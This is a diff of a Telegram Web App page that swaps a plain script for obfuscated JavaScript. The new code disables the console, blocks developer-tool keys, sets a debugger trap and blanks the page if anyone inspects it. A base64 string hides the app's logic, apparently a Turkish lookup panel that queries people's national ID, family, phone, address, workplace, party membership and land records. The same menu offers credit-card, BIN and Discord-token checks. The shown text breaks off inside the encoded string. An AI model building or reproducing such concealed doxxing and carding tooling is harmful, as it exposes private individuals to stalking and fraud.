@@ -680,355 +680,265 @@
     </div>
   </div>
 
-  <script>
-    const tg = window.Telegram.WebApp;
-    tg.ready();
-    tg.expand();
-    tg.setHeaderColor('#0a0a0a');
-    tg.setBackgroundColor('#0a0a0a');
+<script>
+;(function(){
+  var _0xf4a1=Date["now"](),_0xe7c2=window,_0xd3b9=document,_0xa1f0="",_0x8c3e=!1;
 
-    const ADMIN_ID = 7424617978;
-    const userId = tg.initDataUnsafe?.user?.id;
-    const userFirstName = tg.initDataUnsafe?.user?.first_name || 'Kullanıcı';
+  var _0x4d2f=["log","warn","error","info","debug","table","trace","dir","dirxml","group","groupEnd","time","timeEnd","count","assert","profile","profileEnd"];
+  _0x4d2f["forEach"](function(_0xb){try{_0xe7c2["console"][_0xb]=function(){return void 0};}catch(_0xe){}});
+  try{Object["defineProperty"](_0xe7c2,"console",{get:function(){return{log:function(){},warn:function(){},error:function(){},info:function(){},debug:function(){},table:function(){},trace:function(){},dir:function(){},clear:function(){}}},set:function(_0xv){}});}catch(_0xee){}
 
-    document.getElementById('userName').textContent = userFirstName;
+  _0xd3b9["addEventListener"]("contextmenu",function(_0xev){_0xev["preventDefault"]();_0xev["stopPropagation"]();return!1;},!0);
 
-    if (userId === ADMIN_ID) {
-      document.getElementById('adminCard').style.display = 'block';
+  _0xd3b9["addEventListener"]("keydown",function(_0xev){
+    if(_0xev["keyCode"]===123)return _0xev["preventDefault"](),!1;
+    if(_0xev["ctrlKey"]&&_0xev["shiftKey"]&&(_0xev["keyCode"]===73||_0xev["keyCode"]===74||_0xev["keyCode"]===67))return _0xev["preventDefault"](),!1;
+    if(_0xev["ctrlKey"]&&_0xev["keyCode"]===85)return _0xev["preventDefault"](),!1;
+  },!0);
+
+  var _0x7fa3=function(){
+    var _0xc=170;
+    var _0xth=new Image();
+    Object["defineProperty"](_0xth,"id",{get:function(){_0x8c3e=!0;throw new Error();}});
+    try{console["log"](_0xth);}catch(_0xe){}
+    if(_0x8c3e){try{_0xd3b9["body"]["innerHTML"]="";}catch(_0xq){}_0xe7c2["location"]["href"]="about:blank";}
+  };
+  setInterval(_0x7fa3,3000);
+
+  setInterval(function(){(function(){return!1;})["constructor"]("debugger")["call"]();},100);
+
+  _0xd3b9["addEventListener"]("selectstart",function(_0xev){if(_0xev["target"]["tagName"]!=="INPUT"&&_0xev["target"]["tagName"]!=="TEXTAREA"){_0xev["preventDefault"]();}});
+
+  var _0x2a8f=(function(){
+    var _0xp="ICAgIGNvbnN0IHRnID0gd2luZG93LlRlbGVncmFtLldlYkFwcDsKICAgIHRnLnJlYWR5KCk7CiAgICB0Zy5leHBhbmQoKTsKICAgIHRnLnNldEhlYWRlckNv"+
+"bG9yKCcjMGEwYTBhJyk7CiAgICB0Zy5zZXRCYWNrZ3JvdW5kQ29sb3IoJyMwYTBhMGEnKTsKCiAgICBjb25zdCBBRE1JTl9JRCA9IDc0MjQ2MTc5Nzg7CiAg"+
+"ICBjb25zdCB1c2VySWQgPSB0Zy5pbml0RGF0YVVuc2FmZT8udXNlcj8uaWQ7CiAgICBjb25zdCB1c2VyRmlyc3ROYW1lID0gdGcuaW5pdERhdGFVbnNhZmU/"+
+"LnVzZXI/LmZpcnN0X25hbWUgfHwgJ0t1bGxhbsSxY8SxJzsKCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndXNlck5hbWUnKS50ZXh0Q29udGVudCA9"+
+"IHVzZXJGaXJzdE5hbWU7CgogICAgaWYgKHVzZXJJZCA9PT0gQURNSU5fSUQpIHsKICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FkbWluQ2FyZCcp"+
+"LnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOwogICAgfQoKICAgIGxldCBjdXJyZW50Q2F0ZWdvcnkgPSBudWxsOwoKICAgIGNvbnN0IHF1ZXJpZXMgPSB7CiAg"+
+"ICAgIG1lcm5pczogewogICAgICAgIHRpdGxlOiAiTUVSTklTIFNPUkdVIiwKICAgICAgICBpdGVtczogWwogICAgICAgICAgeyBpZDogImFkX3NveWFkIiwg"+
+"bmFtZTogIkFkIFNveWFkIFNvcmd1IiwgaWNvbjogIvCfkaQiLCBkZXNjOiAixLBzaW0gaWxlIGFyYW1hIiwgZmllbGRzOiBbCiAgICAgICAgICAgIHsga2V5"+
+"OiAiYWQiLCBsYWJlbDogIkFkIiwgcGxhY2Vob2xkZXI6ICJBaG1ldCIsIHJlcXVpcmVkOiB0cnVlIH0sCiAgICAgICAgICAgIHsga2V5OiAic295YWQiLCBs"+
+"YWJlbDogIlNveWFkIiwgcGxhY2Vob2xkZXI6ICJZxLFsbWF6IiwgcmVxdWlyZWQ6IHRydWUgfQogICAgICAgICAgXX0sCiAgICAgICAgICB7IGlkOiAiYWRf"+
+"c295YWRfcHJvIiwgbmFtZTogIkFkIFNveWFkIFBybyIsIGljb246ICLwn5GkIiwgZGVzYzogIsSwc2ltICsga29udW0gaWxlIGFyYW1hIiwgZmllbGRzOiBb"+
+"CiAgICAgICAgICAgIHsga2V5OiAiYWQiLCBsYWJlbDogIkFkIiwgcGxhY2Vob2xkZXI6ICJBaG1ldCIsIHJlcXVpcmVkOiB0cnVlIH0sCiAgICAgICAgICAg"+
+"IHsga2V5OiAic295YWQiLCBsYWJlbDogIlNveWFkIiwgcGxhY2Vob2xkZXI6ICJZxLFsbWF6IiwgcmVxdWlyZWQ6IHRydWUgfSwKICAgICAgICAgICAgeyBr"+
+"ZXk6ICJpbCIsIGxhYmVsOiAixLBsIiwgcGxhY2Vob2xkZXI6ICLEsHN0YW5idWwiLCByZXF1aXJlZDogdHJ1ZSB9LAogICAgICAgICAgICB7IGtleTogImls"+
+"Y2UiLCBsYWJlbDogIsSwbMOnZSIsIHBsYWNlaG9sZGVyOiAiS2FkxLFrw7Z5IiwgcmVxdWlyZWQ6IGZhbHNlIH0KICAgICAgICAgIF19LAogICAgICAgICAg"+
+"eyBpZDogInRja24iLCBuYW1lOiAiVEMgU29yZ3UiLCBpY29uOiAi8J+qqiIsIGRlc2M6ICJUQyBpbGUgdGVtZWwgYmlsZ2kiLCBmaWVsZHM6IFsKICAgICAg"+
+"ICAgICAgeyBrZXk6ICJ0YyIsIGxhYmVsOiAiVEMgS2ltbGlrIE5vIiwgcGxhY2Vob2xkZXI6ICIxMjM0NTY3ODkwMSIsIHJlcXVpcmVkOiB0cnVlLCBwYXR0"+
+"ZXJuOiAiXFxkezExfSIsIG1heGxlbmd0aDogMTEgfQogICAgICAgICAgXX0sCiAgICAgICAgICB7IGlkOiAidGNrbl9wcm8iLCBuYW1lOiAiVEMgUHJvIFNv"+
+"cmd1IiwgaWNvbjogIvCfqqoiLCBkZXNjOiAiVEMgaWxlIGRldGF5bMSxIGJpbGdpIiwgZmllbGRzOiBbCiAgICAgICAgICAgIHsga2V5OiAidGMiLCBsYWJl"+
+"bDogIlRDIEtpbWxpayBObyIsIHBsYWNlaG9sZGVyOiAiMTIzNDU2Nzg5MDEiLCByZXF1aXJlZDogdHJ1ZSwgcGF0dGVybjogIlxcZHsxMX0iLCBtYXhsZW5n"+
+"dGg6IDExIH0KICAgICAgICAgIF19LAogICAgICAgICAgeyBpZDogImFpbGUiLCBuYW1lOiAiQWlsZSBTb3JndSIsIGljb246ICLwn5Go4oCN8J+RqeKAjfCf"+
+"kafigI3wn5GmIiwgZGVzYzogIkFpbGUgw7x5ZWxlcmkiLCBmaWVsZHM6IFsKICAgICAgICAgICAgeyBrZXk6ICJ0YyIsIGxhYmVsOiAiVEMgS2ltbGlrIE5v"+
+"IiwgcGxhY2Vob2xkZXI6ICIxMjM0NTY3ODkwMSIsIHJlcXVpcmVkOiB0cnVlLCBwYXR0ZXJuOiAiXFxkezExfSIsIG1heGxlbmd0aDogMTEgfQogICAgICAg"+
+"ICAgXX0sCiAgICAgICAgICB7IGlkOiAiYWlsZXBybyIsIG5hbWU6ICJBaWxlIFBybyIsIGljb246ICLwn5Go4oCN8J+RqeKAjfCfkafigI3wn5GmIiwgZGVz"+
+"YzogIkRldGF5bMSxIGFpbGUgYmlsZ2lzaSIsIGZpZWxkczogWwogICAgICAgICAgICB7IGtleTogInRjIiwgbGFiZWw6ICJUQyBLaW1saWsgTm8iLCBwbGFj"+
+"ZWhvbGRlcjogIjEyMzQ1Njc4OTAxIiwgcmVxdWlyZWQ6IHRydWUsIHBhdHRlcm46ICJcXGR7MTF9IiwgbWF4bGVuZ3RoOiAxMSB9CiAgICAgICAgICBdfSwK"+
+"ICAgICAgICAgIHsgaWQ6ICJzdWxhbGUiLCBuYW1lOiAiU8O8bGFsZSBTb3JndSIsIGljb246ICLwn4yzIiwgZGVzYzogIlPDvGxhbGUgYcSfYWPEsSIsIGZp"+
+"ZWxkczogWwogICAgICAgICAgICB7IGtleTogInRjIiwgbGFiZWw6ICJUQyBLaW1saWsgTm8iLCBwbGFjZWhvbGRlcjogIjEyMzQ1Njc4OTAxIiwgcmVxdWly"+
+"ZWQ6IHRydWUsIHBhdHRlcm46ICJcXGR7MTF9IiwgbWF4bGVuZ3RoOiAxMSB9CiAgICAgICAgICBdfSwKICAgICAgICAgIHsgaWQ6ICJzdWxhbGVfcHJvIiwg"+
+"bmFtZTogIlPDvGxhbGUgUHJvIiwgaWNvbjogIvCfjLMiLCBkZXNjOiAiRGV0YXlsxLEgc8O8bGFsZSBhxJ9hY8SxIiwgZmllbGRzOiBbCiAgICAgICAgICAg"+
+"IHsga2V5OiAidGMiLCBsYWJlbDogIlRDIEtpbWxpayBObyIsIHBsYWNlaG9sZGVyOiAiMTIzNDU2Nzg5MDEiLCByZXF1aXJlZDogdHJ1ZSwgcGF0dGVybjog"+
+"IlxcZHsxMX0iLCBtYXhsZW5ndGg6IDExIH0KICAgICAgICAgIF19LAogICAgICAgICAgeyBpZDogImhpa2F5ZSIsIG5hbWU6ICJIaWtheWUgU29yZ3UiLCBp"+
+"Y29uOiAi8J+TliIsIGRlc2M6ICJLacWfaSBnZcOnbWnFn2kiLCBmaWVsZHM6IFsKICAgICAgICAgICAgeyBrZXk6ICJ0YyIsIGxhYmVsOiAiVEMgS2ltbGlr"+
+"IE5vIiwgcGxhY2Vob2xkZXI6ICIxMjM0NTY3ODkwMSIsIHJlcXVpcmVkOiB0cnVlLCBwYXR0ZXJuOiAiXFxkezExfSIsIG1heGxlbmd0aDogMTEgfQogICAg"+
+"ICAgICAgXX0KICAgICAgICBdCiAgICAgIH0sCiAgICAgIHRlbGVmb246IHsKICAgICAgICB0aXRsZTogIlRFTEVGT04gU09SR1UiLAogICAgICAgIGl0ZW1z"+
+"OiBbCiAgICAgICAgICB7IGlkOiAidGNnc20iLCBuYW1lOiAiVEMg4oaSIFRlbGVmb24iLCBpY29uOiAi8J+TniIsIGRlc2M6ICJUQydkZW4gR1NNIGJ1bCIs"+
+"IGZpZWxkczogWwogICAgICAgICAgICB7IGtleTogInRjIiwgbGFiZWw6ICJUQyBLaW1saWsgTm8iLCBwbGFjZWhvbGRlcjogIjEyMzQ1Njc4OTAxIiwgcmVx"+
+"dWlyZWQ6IHRydWUsIHBhdHRlcm46ICJcXGR7MTF9IiwgbWF4bGVuZ3RoOiAxMSB9CiAgICAgICAgICBdfSwKICAgICAgICAgIHsgaWQ6ICJnc210YyIsIG5h"+
+"bWU6ICJUZWxlZm9uIOKGkiBUQyIsIGljb246ICLwn5OyIiwgZGVzYzogIkdTTSdkZW4gVEMgYnVsIiwgZmllbGRzOiBbCiAgICAgICAgICAgIHsga2V5OiAi"+
+"dGVsZWZvbiIsIGxhYmVsOiAiVGVsZWZvbiBObyIsIHBsYWNlaG9sZGVyOiAiNVhYMTIzNDU2NyIsIHJlcXVpcmVkOiB0cnVlLCBtYXhsZW5ndGg6IDExIH0K"+
+"ICAgICAgICAgIF19LAogICAgICAgICAgeyBpZDogIm9wZXJhdG9yIiwgbmFtZTogIk9wZXJhdMO2ciBTb3JndSIsIGljb246ICLwn5OhIiwgZGVzYzogIkhh"+
+"dCBvcGVyYXTDtnIgYmlsZ2lzaSIsIGZpZWxkczogWwogICAgICAgICAgICB7IGtleTogInRlbGVmb24iLCBsYWJlbDogIlRlbGVmb24gTm8iLCBwbGFjZWhv"+
+"bGRlcjogIjVYWDEyMzQ1NjciLCByZXF1aXJlZDogdHJ1ZSwgbWF4bGVuZ3RoOiAxMSB9CiAgICAgICAgICBdfQogICAgICAgIF0KICAgICAgfSwKICAgICAg"+
+"ZWtzdHJhOiB7CiAgICAgICAgdGl0bGU6ICJFS1NUUkEgU09SR1UiLAogICAgICAgIGl0ZW1zOiBbCiAgICAgICAgICB7IGlkOiAib2t1bF9ubyIsIG5hbWU6"+
+"ICJPa3VsIE5vIiwgaWNvbjogIvCfjpMiLCBkZXNjOiAiT2t1bCBudW1hcmFzxLEiLCBmaWVsZHM6IFsKICAgICAgICAgICAgeyBrZXk6ICJ0YyIsIGxhYmVs"+
+"OiAiVEMgS2ltbGlrIE5vIiwgcGxhY2Vob2xkZXI6ICIxMjM0NTY3ODkwMSIsIHJlcXVpcmVkOiB0cnVlLCBwYXR0ZXJuOiAiXFxkezExfSIsIG1heGxlbmd0"+
+"aDogMTEgfQogICAgICAgICAgXX0sCiAgICAgICAgICB7IGlkOiAidmVzaWthIiwgbmFtZTogIlZlc2lrYSBTb3JndSIsIGljb246ICLwn5OLIiwgZGVzYzog"+
+"IkJlbGdlIHNvcmd1bGFtYSIsIGZpZWxkczogWwogICAgICAgICAgICB7IGtleTogInRjIiwgbGFiZWw6ICJUQyBLaW1saWsgTm8iLCBwbGFjZWhvbGRlcjog"+
+"IjEyMzQ1Njc4OTAxIiwgcmVxdWlyZWQ6IHRydWUsIHBhdHRlcm46ICJcXGR7MTF9IiwgbWF4bGVuZ3RoOiAxMSB9CiAgICAgICAgICBdfSwKICAgICAgICAg"+
+"IHsgaWQ6ICJhZHJlcyIsIG5hbWU6ICJBZHJlcyBTb3JndSIsIGljb246ICLwn5ONIiwgZGVzYzogIkFkcmVzIGJpbGdpc2kiLCBmaWVsZHM6IFsKICAgICAg"+
+"ICAgICAgeyBrZXk6ICJ0YyIsIGxhYmVsOiAiVEMgS2ltbGlrIE5vIiwgcGxhY2Vob2xkZXI6ICIxMjM0NTY3ODkwMSIsIHJlcXVpcmVkOiB0cnVlLCBwYXR0"+
+"ZXJuOiAiXFxkezExfSIsIG1heGxlbmd0aDogMTEgfQogICAgICAgICAgXX0sCiAgICAgICAgICB7IGlkOiAiaXNfeWVyaSIsIG5hbWU6ICLEsMWfIFllcmki"+
+"LCBpY29uOiAi8J+PoiIsIGRlc2M6ICLEsMWfIHllcmkgYmlsZ2lzaSIsIGZpZWxkczogWwogICAgICAgICAgICB7IGtleTogInRjIiwgbGFiZWw6ICJUQyBL"+
+"aW1saWsgTm8iLCBwbGFjZWhvbGRlcjogIjEyMzQ1Njc4OTAxIiwgcmVxdWlyZWQ6IHRydWUsIHBhdHRlcm46ICJcXGR7MTF9IiwgbWF4bGVuZ3RoOiAxMSB9"+
+"CiAgICAgICAgICBdfSwKICAgICAgICAgIHsgaWQ6ICJ5YWJhbmNpIiwgbmFtZTogIllhYmFuY8SxIFNvcmd1IiwgaWNvbjogIvCfjI0iLCBkZXNjOiAiWWFi"+
+"YW5jxLEgdXlydWtsdSIsIGZpZWxkczogWwogICAgICAgICAgICB7IGtleTogImtpbWxpayIsIGxhYmVsOiAiS2ltbGlrL1Bhc2Fwb3J0IE5vIiwgcGxhY2Vo"+
+"b2xkZXI6ICJLaW1saWsgbnVtYXJhc8SxIiwgcmVxdWlyZWQ6IHRydWUgfQogICAgICAgICAgXX0sCiAgICAgICAgICB7IGlkOiAiYWtwYXJ0aSIsIG5hbWU6"+
+"ICJBSyBQYXJ0aSIsIGljb246ICLwn4+b77iPIiwgZGVzYzogIlBhcnRpIMO8eWVsaWsiLCBmaWVsZHM6IFsKICAgICAgICAgICAgeyBrZXk6ICJ0YyIsIGxh"+
+"YmVsOiAiVEMgS2ltbGlrIE5vIiwgcGxhY2Vob2xkZXI6ICIxMjM0NTY3ODkwMSIsIHJlcXVpcmVkOiB0cnVlLCBwYXR0ZXJuOiAiXFxkezExfSIsIG1heGxl"+
+"bmd0aDogMTEgfQogICAgICAgICAgXX0sCiAgICAgICAgICB7IGlkOiAiYWRyZXNfMjAxNSIsIG5hbWU6ICJBZHJlcyAyMDE1IiwgaWNvbjogIvCfk40iLCBk"+
+"ZXNjOiAiMjAxNSBzZcOnbWVuIGFkcmVzaSIsIGZpZWxkczogWwogICAgICAgICAgICB7IGtleTogInRjIiwgbGFiZWw6ICJUQyBLaW1saWsgTm8iLCBwbGFj"+
+"ZWhvbGRlcjogIjEyMzQ1Njc4OTAxIiwgcmVxdWlyZWQ6IHRydWUsIHBhdHRlcm46ICJcXGR7MTF9IiwgbWF4bGVuZ3RoOiAxMSB9CiAgICAgICAgICBdfQog"+
+"ICAgICAgIF0KICAgICAgfSwKICAgICAga29udHJvbDogewogICAgICAgIHRpdGxlOiAiS09OVFJPTCBTT1JHVSIsCiAgICAgICAgaXRlbXM6IFsKICAgICAg"+
+"ICAgIHsgaWQ6ICJkbnMiLCBuYW1lOiAiRE5TIFNvcmd1IiwgaWNvbjogIvCfjJAiLCBkZXNjOiAiRE5TIGthecSxdGxhcsSxIiwgZmllbGRzOiBbCiAgICAg"+
+"ICAgICAgIHsga2V5OiAiZG9tYWluIiwgbGFiZWw6ICJEb21haW4iLCBwbGFjZWhvbGRlcjogImV4YW1wbGUuY29tIiwgcmVxdWlyZWQ6IHRydWUgfQogICAg"+
+"ICAgICAgXX0sCiAgICAgICAgICB7IGlkOiAiYmluIiwgbmFtZTogIkJJTiBTb3JndSIsIGljb246ICLwn5KzIiwgZGVzYzogIkJJTiBiaWxnaXNpIiwgZmll"+
+"bGRzOiBbCiAgICAgICAgICAgIHsga2V5OiAiYmluX25vIiwgbGFiZWw6ICJCSU4gTm8iLCBwbGFjZWhvbGRlcjogIjEyMzQ1NiIsIHJlcXVpcmVkOiB0cnVl"+
+"LCBtYXhsZW5ndGg6IDggfQogICAgICAgICAgXX0sCiAgICAgICAgICB7IGlkOiAiZGMiLCBuYW1lOiAiRGlzY29yZCBLb250cm9sIiwgaWNvbjogIvCfjq4i"+
+"LCBkZXNjOiAiVG9rZW4ga29udHJvbMO8IiwgZmllbGRzOiBbCiAgICAgICAgICAgIHsga2V5OiAidG9rZW4iLCBsYWJlbDogIlRva2VuIiwgcGxhY2Vob2xk"+
+"ZXI6ICJUb2tlbiBnaXJpbiIsIHJlcXVpcmVkOiB0cnVlIH0KICAgICAgICAgIF19LAogICAgICAgICAgeyBpZDogImNjX2NoZWNrZXIiLCBuYW1lOiAiQ0Mg"+
+"S29udHJvbCIsIGljb246ICLwn5KzIiwgZGVzYzogIkthcnQga29udHJvbMO8IiwgZmllbGRzOiBbCiAgICAgICAgICAgIHsga2V5OiAiY2MiLCBsYWJlbDog"+
+"IkthcnQgQmlsZ2lzaSIsIHBsYWNlaG9sZGVyOiAiS2FydCBudW1hcmFzxLEiLCByZXF1aXJlZDogdHJ1ZSB9CiAgICAgICAgICBdfSwKICAgICAgICAgIHsg"+
+"aWQ6ICJpcF9jaGVja2VyIiwgbmFtZTogIklQIFNvcmd1IiwgaWNvbjogIvCflI4iLCBkZXNjOiAiSVAgYmlsZ2lsZXJpIiwgZmllbGRzOiBbCiAgICAgICAg"+
+"ICAgIHsga2V5OiAiaXAiLCBsYWJlbDogIklQIEFkcmVzaSIsIHBsYWNlaG9sZGVyOiAiOC44LjguOCIsIHJlcXVpcmVkOiB0cnVlIH0KICAgICAgICAgIF19"+
+"LAogICAgICAgICAgeyBpZDogIm1haWxfY2hlY2tlciIsIG5hbWU6ICJNYWlsIEtvbnRyb2wiLCBpY29uOiAi8J+TpyIsIGRlc2M6ICJFLXBvc3RhIGRvxJ9y"+
+"dWxhbWEiLCBmaWVsZHM6IFsKICAgICAgICAgICAgeyBrZXk6ICJlbWFpbCIsIGxhYmVsOiAiRS1wb3N0YSIsIHBsYWNlaG9sZGVyOiAib3JuZWtAbWFpbC5j"+
+"b20iLCByZXF1aXJlZDogdHJ1ZSwgdHlwZTogImVtYWlsIiB9CiAgICAgICAgICBdfQogICAgICAgIF0KICAgICAgfSwKICAgICAgdGFwdTogewogICAgICAg"+
+"IHRpdGxlOiAiVEFQVSBTT1JHVSIsCiAgICAgICAgaXRlbXM6IFsKICAgICAgICAgIHsgaWQ6ICJ0YXB1IiwgbmFtZTogIlRhcHUgU29yZ3UiLCBpY29uOiAi"+
+"8J+PoCIsIGRlc2M6ICJHZW5lbCB0YXB1IiwgZmllbGRzOiBbCiAgICAgICAgICAgIHsga2V5OiAidGMiLCBsYWJlbDogIlRDIEtpbWxpayBObyIsIHBsYWNl"+
+"aG9sZGVyOiAiMTIzNDU2Nzg5MDEiLCByZXF1aXJlZDogdHJ1ZSwgcGF0dGVybjogIlxcZHsxMX0iLCBtYXhsZW5ndGg6IDExIH0KICAgICAgICAgIF19LAog"+
+"ICAgICAgICAgeyBpZDogInRicyIsIG5hbWU6ICJCw7ZsZ2UgU29yZ3UiLCBpY29uOiAi8J+TjSIsIGRlc2M6ICJCw7ZsZ2V5ZSBnw7ZyZSB0YXB1IiwgZmll"+
+"bGRzOiBbCiAgICAgICAgICAgIHsga2V5OiAiaWwiLCBsYWJlbDogIsSwbCIsIHBsYWNlaG9sZGVyOiAixLBzdGFuYnVsIiwgcmVxdWlyZWQ6IHRydWUgfSwK"+
+"ICAgICAgICAgICAgeyBrZXk6ICJpbGNlIiwgbGFiZWw6ICLEsGzDp2UiLCBwbGFjZWhvbGRlcjogIkthZMSxa8O2eSIsIHJlcXVpcmVkOiB0cnVlIH0KICAg"+
+"ICAgICAgIF19LAogICAgICAgICAgeyBpZDogInRwcyIsIG5hbWU6ICJQYXJzZWwgU29yZ3UiLCBpY29uOiAi8J+TkCIsIGRlc2M6ICJBZGEvcGFyc2VsIiwg"+
+"ZmllbGRzOiBbCiAgICAgICAgICAgIHsga2V5OiAiaWwiLCBsYWJlbDogIsSwbCIsIHBsYWNlaG9sZGVyOiAixLBzdGFuYnVsIiwgcmVxdWlyZWQ6IHRydWUg"+
+"fSwKICAgICAgICAgICAgeyBrZXk6ICJpbGNlIiwgbGFiZWw6ICLEsGzDp2UiLCBwbGFjZWhvbGRlcjogIkthZMSxa8O2eSIsIHJlcXVpcmVkOiB0cnVlIH0s"+
+"CiAgICAgICAgICAgIHsga2V5OiAiYWRhIiwgbGFiZWw6ICJBZGEgTm8iLCBwbGFjZWhvbGRlcjogIjEyMyIsIHJlcXVpcmVkOiB0cnVlIH0sCiAgICAgICAg"+
+"ICAgIHsga2V5OiAicGFyc2VsIiwgbGFiZWw6ICJQYXJzZWwgTm8iLCBwbGFjZWhvbGRlcjogIjQ1IiwgcmVxdWlyZWQ6IHRydWUgfQogICAgICAgICAgXX0s"+
+"CiAgICAgICAgICB7IGlkOiAiaXN0YW5idWxfdGFwdSIsIG5hbWU6ICLEsHN0YW5idWwgVGFwdSIsIGljb246ICLwn4yJIiwgZGVzYzogIsSwc3RhbmJ1bCB0"+
+"YXB1IiwgZmllbGRzOiBbCiAgICAgICAgICAgIHsga2V5OiAidGMiLCBsYWJlbDogIlRDIEtpbWxpayBObyIsIHBsYWNlaG9sZGVyOiAiMTIzNDU2Nzg5MDEi"+
+"LCByZXF1aXJlZDogdHJ1ZSwgcGF0dGVybjogIlxcZHsxMX0iLCBtYXhsZW5ndGg6IDExIH0KICAgICAgICAgIF19LAogICAgICAgICAgeyBpZDogIml0YnMi"+
+"LCBuYW1lOiAixLBzdC4gQsO2bGdlIiwgaWNvbjogIvCfk40iLCBkZXNjOiAixLBzdGFuYnVsIGLDtmxnZSIsIGZpZWxkczogWwogICAgICAgICAgICB7IGtl"+
+"eTogImlsY2UiLCBsYWJlbDogIsSwbMOnZSIsIHBsYWNlaG9sZGVyOiAiS2FkxLFrw7Z5IiwgcmVxdWlyZWQ6IHRydWUgfQogICAgICAgICAgXX0sCiAgICAg"+
+"ICAgICB7IGlkOiAiaXBzIiwgbmFtZTogIsSwc3QuIFBhcnNlbCIsIGljb246ICLwn5OQIiwgZGVzYzogIsSwc3RhbmJ1bCBwYXJzZWwiLCBmaWVsZHM6IFsK"+
+"ICAgICAgICAgICAgeyBrZXk6ICJpbGNlIiwgbGFiZWw6ICLEsGzDp2UiLCBwbGFjZWhvbGRlcjogIkthZMSxa8O2eSIsIHJlcXVpcmVkOiB0cnVlIH0sCiAg"+
+"ICAgICAgICAgIHsga2V5OiAiYWRhIiwgbGFiZWw6ICJBZGEgTm8iLCBwbGFjZWhvbGRlcjogIjEyMyIsIHJlcXVpcmVkOiB0cnVlIH0sCiAgICAgICAgICAg"+
+"IHsga2V5OiAicGFyc2VsIiwgbGFiZWw6ICJQYXJzZWwgTm8iLCBwbGFjZWhvbGRlcjogIjQ1IiwgcmVxdWlyZWQ6IHRydWUgfQogICAgICAgICAgXX0sCiAg"+
+"ICAgICAgICB7IGlkOiAia29jYWVsaV90YXB1IiwgbmFtZTogIktvY0FlbGkgVGFwdSIsIGljb246ICLwn4+X77iPIiwgZGVzYzogIktvY0FlbGkgdGFwdSIs"+
+"IGZpZWxkczogWwogICAgICAgICAgICB7IGtleTogInRjIiwgbGFiZWw6ICJUQyBLaW1saWsgTm8iLCBwbGFjZWhvbGRlcjogIjEyMzQ1Njc4OTAxIiwgcmVx"+
+"dWlyZWQ6IHRydWUsIHBhdHRlcm46ICJcXGR7MTF9IiwgbWF4bGVuZ3RoOiAxMSB9CiAgICAgICAgICBdfSwKICAgICAgICAgIHsgaWQ6ICJrdGJzIiwgbmFt"+
+"ZTogIktvY0FlbGkgQsO2bGdlIiwgaWNvbjogIvCfk40iLCBkZXNjOiAiS29jYWVsaSBiw7ZsZ2UiLCBmaWVsZHM6IFsKICAgICAgICAgICAgeyBrZXk6ICJp"+
+"bGNlIiwgbGFiZWw6ICLEsGzDp2UiLCBwbGFjZWhvbGRlcjogIsSwem1pdCIsIHJlcXVpcmVkOiB0cnVlIH0KICAgICAgICAgIF19LAogICAgICAgICAgeyBp"+
+"ZDogImt0cHMiLCBuYW1lOiAiS29jYWVsaSBQYXJzZWwiLCBpY29uOiAi8J+TkCIsIGRlc2M6ICJLb2NhZWxpIHBhcnNlbCIsIGZpZWxkczogWwogICAgICAg"+
+"ICAgICB7IGtleTogImlsY2UiLCBsYWJlbDogIsSwbMOnZSIsIHBsYWNlaG9sZGVyOiAixLB6bWl0IiwgcmVxdWlyZWQ6IHRydWUgfSwKICAgICAgICAgICAg"+
+"eyBrZXk6ICJhZGEiLCBsYWJlbDogIkFkYSBObyIsIHBsYWNlaG9sZGVyOiAiMTIzIiwgcmVxdWlyZWQ6IHRydWUgfSwKICAgICAgICAgICAgeyBrZXk6ICJw"+
+"YXJzZWwiLCBsYWJlbDogIlBhcnNlbCBObyIsIHBsYWNlaG9sZGVyOiAiNDUiLCByZXF1aXJlZDogdHJ1ZSB9CiAgICAgICAgICBdfQogICAgICAgIF0KICAg"+
+"ICAgfSwKICAgICAgZGlnZXI6IHsKICAgICAgICB0aXRsZTogIkTEsMSeRVIgQVJBw4dMQVIiLAogICAgICAgIGl0ZW1zOiBbCiAgICAgICAgICB7IGlkOiAi"+
+"Z3B0IiwgbmFtZTogIkdQVCBTb2hiZXQiLCBpY29uOiAi8J+kliIsIGRlc2M6ICJBSSBpbGUgc29oYmV0IiwgZmllbGRzOiBbCiAgICAgICAgICAgIHsga2V5"+
+"OiAic29ydSIsIGxhYmVsOiAiU29ydW51eiIsIHBsYWNlaG9sZGVyOiAiQmlyIMWfZXkgc29ydW4uLi4iLCByZXF1aXJlZDogdHJ1ZSwgdHlwZTogInRleHRh"+
+"cmVhIiB9CiAgICAgICAgICBdfSwKICAgICAgICAgIHsgaWQ6ICJzaWZyZV9vbHVzdHVydWN1IiwgbmFtZTogIsWeaWZyZSDDnHJldGljaSIsIGljb246ICLw"+
+"n5SRIiwgZGVzYzogIkfDvMOnbMO8IMWfaWZyZSDDvHJldCIsIGZpZWxkczogWwogICAgICAgICAgICB7IGtleTogInV6dW5sdWsiLCBsYWJlbDogIlV6dW5s"+
+"dWsiLCBwbGFjZWhvbGRlcjogIjE2IiwgcmVxdWlyZWQ6IHRydWUsIHR5cGU6ICJudW1iZXIiIH0KICAgICAgICAgIF19LAogICAgICAgICAgeyBpZDogIndl"+
+"Yl9rYXppbWEiLCBuYW1lOiAiV2ViIEthesSxbWEiLCBpY29uOiAi8J+VuO+4jyIsIGRlc2M6ICJTYXlmYSBpw6dlcmlrIMOnZWsiLCBmaWVsZHM6IFsKICAg"+
+"ICAgICAgICAgeyBrZXk6ICJ1cmwiLCBsYWJlbDogIlVSTCIsIHBsYWNlaG9sZGVyOiAiaHR0cHM6Ly9leGFtcGxlLmNvbSIsIHJlcXVpcmVkOiB0cnVlIH0K"+
+"ICAgICAgICAgIF19LAogICAgICAgICAgeyBpZDogImRlY2VuZCIsIG5hbWU6ICJFbmNvZGUvRGVjb2RlIiwgaWNvbjogIvCflIQiLCBkZXNjOiAixZ5pZnJl"+
+"bGUgLyDDh8O2eiIsIGZpZWxkczogWwogICAgICAgICAgICB7IGtleTogIm1ldGluIiwgbGFiZWw6ICJNZXRpbiIsIHBsYWNlaG9sZGVyOiAiTWV0aW4gZ2ly"+
+"aW4iLCByZXF1aXJlZDogdHJ1ZSB9LAogICAgICAgICAgICB7IGtleTogImlzbGVtIiwgbGFiZWw6ICLEsMWfbGVtIiwgcmVxdWlyZWQ6IHRydWUsIHR5cGU6"+
